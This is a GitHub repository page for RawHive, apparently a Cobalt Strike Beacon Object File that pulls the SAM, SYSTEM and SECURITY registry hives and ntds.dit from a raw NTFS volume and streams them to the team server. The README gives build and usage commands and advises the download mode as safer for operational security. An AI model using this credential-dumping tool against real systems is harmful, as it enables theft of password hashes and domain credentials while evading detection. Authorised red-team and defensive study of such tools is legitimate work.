# https://github.com/nmht3t/RawHive

[Skip to content](https://github.com/nmht3t/RawHive#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/nmht3t/RawHive) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/nmht3t/RawHive) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/nmht3t/RawHive) to refresh your session.Dismiss alert

{{ message }}

main

[**1** Branch](https://github.com/nmht3t/RawHive/branches) [**0** Tags](https://github.com/nmht3t/RawHive/tags)

[Go to Branches page](https://github.com/nmht3t/RawHive/branches)[Go to Tags page](https://github.com/nmht3t/RawHive/tags)

Go to file

Code

Open more actions menu

## Latest commit

[![nmht3t](https://avatars.githubusercontent.com/u/68638314?v=4&size=40)](https://github.com/nmht3t)[nmht3t](https://github.com/nmht3t/RawHive/commits?author=nmht3t)

[updated img.png](https://github.com/nmht3t/RawHive/commit/2a8f775f4d6ce6b2e7075476b421856302448511)

2 weeks agoOct 11, 2026

[2a8f775](https://github.com/nmht3t/RawHive/commit/2a8f775f4d6ce6b2e7075476b421856302448511) · 2 weeks agoOct 11, 2026

## History

[8 Commits](https://github.com/nmht3t/RawHive/commits/main/)

Open commit details

[View commit history for this file.](https://github.com/nmht3t/RawHive/commits/main/) 8 Commits

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| [LICENSE](https://github.com/nmht3t/RawHive/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/nmht3t/RawHive/blob/main/LICENSE "LICENSE") | [initial release](https://github.com/nmht3t/RawHive/commit/2ffc0ffaa92e5652c11e93d630ac70480a036885 "initial release") | 4 months agoJun 17, 2026 |
| [Makefile](https://github.com/nmht3t/RawHive/blob/main/Makefile "Makefile") | [Makefile](https://github.com/nmht3t/RawHive/blob/main/Makefile "Makefile") | [updated Makefile](https://github.com/nmht3t/RawHive/commit/537c3af393179f0503c05d47949a5a2126841cb1 "updated Makefile") | 2 weeks agoOct 11, 2026 |
| [README.md](https://github.com/nmht3t/RawHive/blob/main/README.md "README.md") | [README.md](https://github.com/nmht3t/RawHive/blob/main/README.md "README.md") | [updated README.md to document BeaconDownload](https://github.com/nmht3t/RawHive/commit/5ddbf7ca7190463dd192da8374ddd6be9c0f793a "updated README.md to document BeaconDownload") | 2 weeks agoOct 11, 2026 |
| [beacon.h](https://github.com/nmht3t/RawHive/blob/main/beacon.h "beacon.h") | [beacon.h](https://github.com/nmht3t/RawHive/blob/main/beacon.h "beacon.h") | [initial release](https://github.com/nmht3t/RawHive/commit/2ffc0ffaa92e5652c11e93d630ac70480a036885 "initial release") | 4 months agoJun 17, 2026 |
| [img.png](https://github.com/nmht3t/RawHive/blob/main/img.png "img.png") | [img.png](https://github.com/nmht3t/RawHive/blob/main/img.png "img.png") | [updated img.png](https://github.com/nmht3t/RawHive/commit/2a8f775f4d6ce6b2e7075476b421856302448511 "updated img.png") | 2 weeks agoOct 11, 2026 |
| [rawhive.c](https://github.com/nmht3t/RawHive/blob/main/rawhive.c "rawhive.c") | [rawhive.c](https://github.com/nmht3t/RawHive/blob/main/rawhive.c "rawhive.c") | [updated rawhive.c to support BeaconDownload](https://github.com/nmht3t/RawHive/commit/5bd61f8c8f30710150a57899324c9ed003f8bffe "updated rawhive.c to support BeaconDownload") | 2 weeks agoOct 11, 2026 |
| [rawhive.cna](https://github.com/nmht3t/RawHive/blob/main/rawhive.cna "rawhive.cna") | [rawhive.cna](https://github.com/nmht3t/RawHive/blob/main/rawhive.cna "rawhive.cna") | [updated cna](https://github.com/nmht3t/RawHive/commit/7693e3b32e87bcd1786120558fd1a377f083ab86 "updated cna") | 2 weeks agoOct 11, 2026 |
| View all files |

## Repository files navigation

# RawHive

[Permalink: RawHive](https://github.com/nmht3t/RawHive#rawhive)

RawHive is a Cobalt Strike BOF for pulling selected Windows registry hives straight from a raw NTFS volume. It skips the normal file APIs, walks NTFS metadata to find the target file records, and reads the bytes directly from disk.

Targets:

- `C:\Windows\System32\config\SAM`
- `C:\Windows\System32\config\SYSTEM`
- `C:\Windows\System32\config\SECURITY`
- `C:\Windows\NTDS\ntds.dit` (domain controllers only)

Any local NTFS drive letter works; the default is `C:`.

## How it works

[Permalink: How it works](https://github.com/nmht3t/RawHive#how-it-works)

1. Opens the volume (for example `\\.\C:`) and reads the boot sector to locate `$MFT`.
2. Walks directory indexes for `Windows`, `System32`, `config`, and the target files, with a bounded MFT scan as fallback.
3. Reads file data from resident attributes or cluster runlists.
4. Streams the bytes over C2 (download mode) or writes them to disk (disk-write mode).

## Requirements

[Permalink: Requirements](https://github.com/nmht3t/RawHive#requirements)

- 64-bit Beacon running as local admin or SYSTEM.
- `x86_64-w64-mingw32-gcc` and `make` for building.

## Build

[Permalink: Build](https://github.com/nmht3t/RawHive#build)

```
make
```

Builds `dist/rawhive.x64.o`. `rawhive.cna` loads the object from `dist/`, so rebuild after changing `rawhive.c`.

## Usage

[Permalink: Usage](https://github.com/nmht3t/RawHive#usage)

Download mode is the default: hives are read straight from the raw volume and pushed to the team server via the BeaconDownload API. Nothing touches the target's disk.

```
rawhive                    # download C: hives to team server
rawhive D                  # download D: hives to team server
```

Disk-write mode saves `.tmp` files to a directory on the target. Note this touches the disk and may not be opsec safe; prefer download mode unless you specifically need the files landed locally.

```
rawhive C:\Windows\Temp           # write C: hives to disk
rawhive C:\Windows\Temp D         # write D: hives to C:\Windows\Temp
```

The volume can be written as `C`, `c`, or `C:`. The output directory must already exist.

## Output

[Permalink: Output](https://github.com/nmht3t/RawHive#output)

Files are named `<host>_<timestamp>_<hive>.tmp`:

```
<host>_<timestamp>_sam.tmp
<host>_<timestamp>_system.tmp
<host>_<timestamp>_security.tmp
<host>_<timestamp>_ntds.tmp       # DCs only
```

In download mode they appear in Cobalt Strike's download tray; in disk-write mode they land in the specified output directory.

## Notes

[Permalink: Notes](https://github.com/nmht3t/RawHive#notes)

- The fallback MFT scan is capped at 500,000 records.
- Runlists are capped at 128 extents; a too-fragmented file fails instead of reporting a partial file as complete.
- Malformed or unsupported NTFS structures are rejected instead of continuing with unsafe offsets.

## Proof of concept

[Permalink: Proof of concept](https://github.com/nmht3t/RawHive#proof-of-concept)

[![RawHive proof of concept](https://github.com/nmht3t/RawHive/raw/main/img.png)](https://github.com/nmht3t/RawHive/blob/main/img.png)

## About

Cobalt Strike BOF that extracts selected Windows registry hives directly from a raw NTFS volume by parsing NTFS metadata and reading file data straight from disk.

### Resources

[Readme](https://github.com/nmht3t/RawHive#readme-ov-file)

[MIT license](https://github.com/nmht3t/RawHive#MIT-1-ov-file)

[Activity](https://github.com/nmht3t/RawHive/activity)

### Stars

**110** stars

### Watchers

**1** watching

### Forks

[**10** forks](https://github.com/nmht3t/RawHive/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fnmht3t%2FRawHive&report=nmht3t+%28user%29)

## [Releases](https://github.com/nmht3t/RawHive/releases)

No releases published

## [Contributors](https://github.com/nmht3t/RawHive/graphs/contributors) 2 (2)

- [![@nmht3t](https://avatars.githubusercontent.com/u/68638314?s=64&v=4)](https://github.com/nmht3t) [**nmht3t**](https://github.com/nmht3t)
- [![@beune](https://avatars.githubusercontent.com/u/47817451?s=64&v=4)](https://github.com/beune) [**beune** Beune](https://github.com/beune)

## Languages

- [C99.4%](https://github.com/nmht3t/RawHive/search?l=c)
- [Makefile0.6%](https://github.com/nmht3t/RawHive/search?l=makefile)

You can’t perform that action at this time.